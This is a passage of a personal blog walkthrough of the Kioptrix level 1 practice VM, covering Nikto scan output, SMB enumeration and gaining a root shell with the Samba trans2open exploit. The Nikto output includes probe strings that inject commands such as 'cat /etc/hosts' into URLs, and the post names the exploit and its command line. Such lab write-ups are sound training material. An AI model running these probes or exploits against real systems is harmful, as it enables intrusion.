Apache&#x2F;1.3.20 appears to be outdated (current is at least Apache&#x2F;2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ mod_ssl&#x2F;2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)</span><br><span class="line">+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE </span><br><span class="line">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span><br><span class="line">+ OSVDB-838: Apache&#x2F;1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.</span><br><span class="line">+ OSVDB-4552: Apache&#x2F;1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.</span><br><span class="line">+ OSVDB-2733: Apache&#x2F;1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.</span><br><span class="line">+ mod_ssl&#x2F;2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name&#x3D;CVE-2002-0082, OSVDB-756.</span><br><span class="line">+ &#x2F;&#x2F;&#x2F;etc&#x2F;hosts: The server install allows reading of any system file by adding an extra &#39;&#x2F;&#39; to the URL.</span><br><span class="line">+ OSVDB-682: &#x2F;usage&#x2F;: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).</span><br><span class="line">+ OSVDB-3268: &#x2F;manual&#x2F;: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: &#x2F;manual&#x2F;: Web server manual found.</span><br><span class="line">+ OSVDB-3268: &#x2F;icons&#x2F;: Directory indexing found.</span><br><span class="line">+ OSVDB-3233: &#x2F;icons&#x2F;README: Apache default file found.</span><br><span class="line">+ OSVDB-3092: &#x2F;test.php: This might be interesting...</span><br><span class="line">+ &#x2F;wp-content&#x2F;themes&#x2F;twentyeleven&#x2F;images&#x2F;headers&#x2F;server.php?filesrc&#x3D;&#x2F;etc&#x2F;hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ &#x2F;wordpresswp-content&#x2F;themes&#x2F;twentyeleven&#x2F;images&#x2F;headers&#x2F;server.php?filesrc&#x3D;&#x2F;etc&#x2F;hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ &#x2F;wp-includes&#x2F;Requests&#x2F;Utility&#x2F;content-post.php?filesrc&#x3D;&#x2F;etc&#x2F;hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ &#x2F;wordpresswp-includes&#x2F;Requests&#x2F;Utility&#x2F;content-post.php?filesrc&#x3D;&#x2F;etc&#x2F;hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ &#x2F;wp-includes&#x2F;js&#x2F;tinymce&#x2F;themes&#x2F;modern&#x2F;Meuhy.php?filesrc&#x3D;&#x2F;etc&#x2F;hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ &#x2F;wordpresswp-includes&#x2F;js&#x2F;tinymce&#x2F;themes&#x2F;modern&#x2F;Meuhy.php?filesrc&#x3D;&#x2F;etc&#x2F;hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ &#x2F;assets&#x2F;mobirise&#x2F;css&#x2F;meta.php?filesrc&#x3D;: A PHP backdoor file manager was found.</span><br><span class="line">+ &#x2F;login.cgi?cli&#x3D;aa%20aa%27cat%20&#x2F;etc&#x2F;hosts: Some D-Link router remote command execution.</span><br><span class="line">+ &#x2F;shell?cat+&#x2F;etc&#x2F;hosts: A backdoor was identified.</span><br><span class="line">+ 8724 requests: 0 error(s) and 30 item(s) reported on remote host</span><br><span class="line">+ End Time:           2021-03-09 21:53:58 (GMT-5) (24 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>If there’s PUT or DELETE method, that would be interesting</p>
<p>scan for https: <code>nikto -h 192.168.0.22:443</code></p>
<h2 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h2><p>add some smb configuration <code>tc/samba/smb.conf </code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">client use spnego &#x3D; no</span><br><span class="line">client ntlmv2 auth &#x3D; no</span><br></pre></td></tr></table></figure>
<p>deprecated.. use the following</p>
<p>SPNEGO is used when a client application wants to authenticate to a remote server, but neither end is sure what authentication protocols the other supports.</p>
<p>not sure why I need those</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 192.168.0.22</span><br></pre></td></tr></table></figure>

<p>Enum4linux is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar functionality to enum.exe formerly available from <a target="_blank" rel="noopener" href="http://www.bindview.com/">www.bindview.com</a>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; </span><br><span class="line">|    Session Check on 192.168.0.22    |</span><br><span class="line"> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; </span><br><span class="line">[E] Server doesn&#39;t allow session using username &#39;&#39;, password &#39;&#39;.  Aborting remainder of tests.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>resolve the issue by adding this to smb.conf:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client min protocol &#x3D; NT1</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; </span><br><span class="line">|    OS information on 192.168.0.22    |</span><br><span class="line"> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; </span><br><span class="line">Use of uninitialized value $os_info in concatenation (.) or string at .&#x2F;enum4linux.pl line 464.</span><br><span class="line">[+] Got OS info for 192.168.0.22 from smbclient: </span><br><span class="line">[+] Got OS info for 192.168.0.22 from srvinfo:</span><br><span class="line">        KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server</span><br><span class="line">        platform_id     :       500</span><br><span class="line">        os version      :       4.5</span><br><span class="line">        server type     :       0x9a03</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>use metasploit to detect smb version</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</span><br><span class="line">set rhosts 192.168.0.22</span><br><span class="line">show options</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p>samba version is <code>Samba 2.2.1a</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">searchsploit samba 2.2</span><br><span class="line">----------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                     |  Path</span><br><span class="line">----------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Samba 2.0.x&#x2F;2.2 - Arbitrary File Creation                                          | unix&#x2F;remote&#x2F;20968.txt</span><br><span class="line">Samba 2.2.0 &lt; 2.2.8 (OSX) - trans2open Overflow (Metasploit)                       | osx&#x2F;remote&#x2F;9924.rb</span><br><span class="line">Samba 2.2.x - &#39;call_trans2open&#39; Remote Buffer Overflow (1)                         | unix&#x2F;remote&#x2F;22468.c</span><br><span class="line">Samba 2.2.x - &#39;call_trans2open&#39; Remote Buffer Overflow (2)                         | unix&#x2F;remote&#x2F;22469.c</span><br><span class="line">Samba 2.2.x - &#39;call_trans2open&#39; Remote Buffer Overflow (3)                         | unix&#x2F;remote&#x2F;22470.c</span><br><span class="line">Samba 2.2.x - &#39;call_trans2open&#39; Remote Buffer Overflow (4)                         | unix&#x2F;remote&#x2F;22471.txt</span><br><span class="line">Samba 2.2.x - &#39;nttrans&#39; Remote Overflow (Metasploit)                               | linux&#x2F;remote&#x2F;9936.rb</span><br><span class="line">Samba 2.2.x - CIFS&#x2F;9000 Server A.01.x Packet Assembling Buffer Overflow            | unix&#x2F;remote&#x2F;22356.c</span><br><span class="line">Samba 2.2.x - Remote Buffer Overflow                                               | linux&#x2F;remote&#x2F;7.pl</span><br><span class="line">---------------------------------------------------------------------------------- ---------------------------------</span><br></pre></td></tr></table></figure>

<p>goto <a target="_blank" rel="noopener" href="https://www.exploit-db.com/search">https://www.exploit-db.com/search</a>, search for trans2open</p>
<p>Tried some exploits, <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/22469">https://www.exploit-db.com/exploits/22469</a> this one works and I successfully get the shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;22469 -t 192.168.0.22 </span><br></pre></td></tr></table></figure>

<p><img src="/images/kioptrix1_root.png" alt="image" title="screenshot of dirbuster"></p>
<h3 id="Nbtscan"><a href="#Nbtscan" class="headerlink" title="Nbtscan"></a>Nbtscan</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nbtscan 192.168.0.22</span><br><span class="line">Doing NBT name scan for addresses from 192.168.0.22</span><br><span class="line"></span><br><span class="line">IP address       NetBIOS Name     Server    User             MAC address      </span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">192.168.0.22     KIOPTRIX         &lt;server&gt;  KIOPTRIX         00:00:00:00:00:00</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Resolve the host name</p>
<p>NetBIOS over TCP/IP (NBT, or sometimes NetBT) is a networking protocol that allows legacy computer applications relying on the NetBIOS API to be used on modern TCP/IP networks. </p>
<p>On Windows, SMB can run directly over TCP/IP without the need for NetBIOS over TCP/IP. This will use, as you point out, port 445.</p>
<p>Generally speaking, on other systems, you’ll find services and applications using port 139. This, basically speaking, means that SMB is running with NetBIOS over TCP/IP, where, stack-wise, SMB is on top of NetBIOS if you are to imagine it with the OSI model.</p>
<p>SMB does rely on NetBIOS for communication with devices that do not support direct hosting of SMB over TCP/IP.</p>
<p>NetBIOS is completely independent from SMB. It is an API that SMB, and other technologies can use, so NetBIOS has no dependency to SMB. </p>
<p><a target="_blank" rel="noopener" href="https://superuser.com/questions/694469/difference-between-netbios-and-smb">https://superuser.com/questions/694469/difference-between-netbios-and-smb</a></p>
<h3 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 192.168.0.22</span><br><span class="line">Enter WORKGROUP\root&#39;s password: </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        IPC$            IPC       IPC Service (Samba Server)</span><br><span class="line">        ADMIN$          IPC       IPC Service (Samba Server)</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">Server does not support EXTENDED_SECURITY  but &#39;client use spnego &#x3D; yes&#39; and &#39;client ntlmv2 auth &#x3D; yes&#39; is set</span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Server               Comment</span><br><span class="line">        ---------            -------</span><br><span class="line">        KIOPTRIX             Samba Server</span><br><span class="line"></span><br><span class="line">        Workgroup            Master</span><br><span class="line">        ---------            -------</span><br><span class="line">        HIRON                INTEL_CE_LINUX</span><br><span class="line">        MYGROUP              KIOPTRIX</span><br><span class="line">                                      </span><br></pre></td></tr></table></figure>
<p>-L, –list=HOST</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient &quot;\\\192.168.0.22\IPC$&quot;</span><br></pre></td></tr></table></figure>
<p>see Not enough ‘&#39; characters in service, just add more backslashes</p>
<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><p>could also try nmap with smb scripts</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script &quot;smb-*&quot; 192.168.0.22</span><br></pre></td></tr></table></figure></div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By Gavin Cui</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>